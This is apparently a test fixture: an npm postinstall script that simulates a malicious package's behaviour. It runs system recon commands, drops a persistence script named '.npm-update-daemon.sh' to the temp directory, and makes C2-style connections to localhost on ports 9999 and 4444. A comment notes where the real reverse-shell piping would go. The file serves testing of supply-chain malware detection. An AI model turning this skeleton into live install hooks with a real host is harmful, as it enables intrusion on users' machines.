#!/usr/bin/env node
// postinstall.js — reverse-shell-test
// Simulates a reverse-shell / process-spawning attack pattern.
// Real-world examples: flatmap-stream, node-ipc sabotage, coa/rc hijacks.
// SAFE: uses only localhost / benign targets; no actual shell is opened.
'use strict';

const { execSync, spawn, spawnSync } = require('child_process');
const net  = require('net');
const os   = require('os');
const fs   = require('fs');
const path = require('path');

// ── 1. Spawn child processes to gather system info (common recon step) ────────
// Real malware runs `id`, `uname -a`, `cat /etc/os-release` etc. before
// deciding whether to proceed with the full payload.
const recon = [
  ['id'],
  ['uname', ['-a']],
  ['whoami'],
  ['hostname'],
];

for (const [cmd, args = []] of recon) {
  try {
    const result = spawnSync(cmd, args, { encoding: 'utf8', timeout: 3000 });
    const out = (result.stdout || '').trim();
    console.log(`[reverse-shell] recon: ${cmd} => "${out.slice(0, 80)}"`);
  } catch (e) {
    console.log(`[reverse-shell] recon: ${cmd} failed:`, e.message);
  }
}

// ── 2. Attempt to write a cron-like persistence file ─────────────────────────
// Real malware drops a script into cron.d / launchd / rc.local.
// We write to /tmp only (safe).
const persistPath = path.join(os.tmpdir(), '.npm-update-daemon.sh');
try {
  fs.writeFileSync(
    persistPath,
    '#!/bin/sh\n# Simulated persistence payload (safe — no actual command)\necho "beacon"\n',
    { mode: 0o755 }
  );
  console.log('[reverse-shell] Persistence script dropped to:', persistPath);
  // Try to make it look like it will survive reboots by touching /etc/cron.d (will fail — expected)
  try { fs.statSync('/etc/cron.d'); console.log('[reverse-shell] /etc/cron.d exists — would install cron entry'); }
  catch (_) { console.log('[reverse-shell] /etc/cron.d not writable (non-fatal)'); }
} catch (e) {
  console.log('[reverse-shell] Failed to drop persistence script:', e.message);
}

// ── 3. TCP reverse-shell handshake simulation ─────────────────────────────────
// Real malware connects back to attacker IP and pipes stdio to a shell.
// We connect to localhost:9999 (nothing is listening — expected failure).
const ATTACKER_HOST = '127.0.0.1';
const ATTACKER_PORT = 9999;

const socket = new net.Socket();
socket.setTimeout(4000);

socket.connect(ATTACKER_PORT, ATTACKER_HOST, () => {
  console.log('[reverse-shell] TCP reverse-shell CONNECTED to', `${ATTACKER_HOST}:${ATTACKER_PORT}`, '(unexpected)');
  // Real code here: socket.pipe(shellProcess.stdin); shellProcess.stdout.pipe(socket)
  socket.destroy();
});

socket.on('timeout', () => {
  console.log('[reverse-shell] TCP reverse-shell timed out (C2 not reachable — expected)');
  socket.destroy();
});

socket.on('error', (err) => {
  console.log('[reverse-shell] TCP reverse-shell connect failed (non-fatal):', err.message);
});

// ── 4. High-numbered unusual port probe (C2 beacon over 4444 / 1337) ─────────
// Attackers commonly use ports 4444 (Metasploit default), 1337, 31337.
const BEACON_PORT = 4444;
const beacon = new net.Socket();
beacon.setTimeout(4000);
beacon.connect(BEACON_PORT, '127.0.0.1', () => {
  console.log('[reverse-shell] Beacon on port', BEACON_PORT, 'CONNECTED (unexpected)');
  beacon.destroy();
});
beacon.on('timeout', () => {
  console.log('[reverse-shell] Beacon port', BEACON_PORT, 'timed out (expected)');
  beacon.destroy();
});
beacon.on('error', (err) => {
  console.log('[reverse-shell] Beacon port', BEACON_PORT, 'failed (non-fatal):', err.message);
});

console.log('[reverse-shell] reverse-shell simulation postinstall complete.');
